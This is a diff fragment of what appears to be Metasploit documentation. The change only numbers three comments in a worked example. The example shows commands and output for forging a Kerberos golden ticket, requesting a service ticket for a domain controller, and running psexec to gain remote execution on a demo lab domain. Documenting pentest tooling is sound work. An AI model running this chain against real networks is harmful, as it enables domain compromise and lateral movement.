@@ -298,14 +298,14 @@ host             service  type                 name  content                   i
 TGS using a previously forged golden ticket:
 
 ```
-# Forge a golden ticket
+# 1. Forge a golden ticket
 msf auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN aes_key=dac659cec15c80bb2bc8b26cdd3f29076cff84da7ab7ec6cf9dfc2cafa33e087 domain_sid=S-1-5-21-2771926996-166873999-4256077803 domain=dev.demo.local spn=krbtgt/DEV.DEMO.LOCAL user=Administrator
 
 [*] TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin
 [*] Auxiliary module execution completed
 
 
-# Request a silver ticket:
+# 2. Request a silver ticket:
 
 msf auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhosts=10.10.11.5 Krb5Ccname=/Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin username=Administrator domain=dev.demo.local spn=cifs/dc02.dev.demo.local
 [*] Running module against 10.10.11.5
@@ -317,7 +317,7 @@ msf auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhosts=10.10.11.5 
 [+] 10.10.11.5:88 - Received a valid delegation TGS-Response
 [*] Auxiliary module execution completed
 
-# Use psexec:
+# 3. Use psexec:
 
 msf exploit(windows/smb/psexec) > run rhost=10.10.11.5 smbdomain=dev.demo.local username=Administrator smb::auth=kerberos smb::krb5ccname=/Users/user/.msf4/loot/20230309120802_default_10.10.11.5_mit.kerberos.cca_352530.bin smb::rhostname=dc02.dev.demo.local domaincontrollerrhost=10.10.11.5 lhost=192.168.123.1
 
